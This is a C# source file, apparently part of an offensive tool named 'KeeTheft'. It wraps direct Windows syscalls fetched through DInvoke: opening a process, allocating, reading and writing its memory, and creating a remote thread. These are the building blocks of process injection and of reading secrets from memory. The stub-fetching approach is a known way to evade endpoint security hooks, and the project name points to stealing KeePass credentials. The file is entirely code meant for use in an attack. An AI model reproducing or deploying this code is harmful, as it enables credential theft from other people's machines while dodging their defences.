using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace KeeTheft
{
    class Syscalls
    {
        public static DI.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref Win32.OBJECT_ATTRIBUTES ObjectAttributes, ref Win32.CLIENT_ID ClientId)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            Delegates.NtOpenProcess ntOpenProcess = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtOpenProcess));

            return ntOpenProcess(
                ref ProcessHandle,
                DesiredAccess,
                ref ObjectAttributes,
                ref ClientId);
        }

        public static DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory ntAllocateVirtualMemory = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtAllocateVirtualMemory));

            return ntAllocateVirtualMemory(
                ProcessHandle,
                ref BaseAddress,
                ZeroBits,
                ref RegionSize,
                AllocationType,
                Protect);
        }

        public static DI.Data.Native.NTSTATUS NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToRead, ref uint NumberOfBytesReaded)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
            Delegates.NtReadVirtualMemory ntReadVirtualMemory = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtReadVirtualMemory));

            return ntReadVirtualMemory(
                ProcessHandle,
                BaseAddress,
                Buffer,
                NumberOfBytesToRead,
                ref NumberOfBytesReaded);
        }

        public static DI.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtWriteVirtualMemory));

            return ntWriteVirtualMemory(
                ProcessHandle,
                BaseAddress,
                Buffer,
                BufferLength,
                ref BytesWritten);
        }

        public static DI.Data.Native.NTSTATUS NtCreateThreadEx(ref IntPtr threadHandle, DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            Delegates.NtCreateThreadEx ntCreateThreadEx = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtCreateThreadEx));

            return ntCreateThreadEx(
                ref threadHandle,
                desiredAccess,
                objectAttributes,
                processHandle,
                startAddress,
                parameter,
                createSuspended,
                stackZeroBits,
                sizeOfStack,
                maximumStackSize,
                attributeList);
        }
    }
}
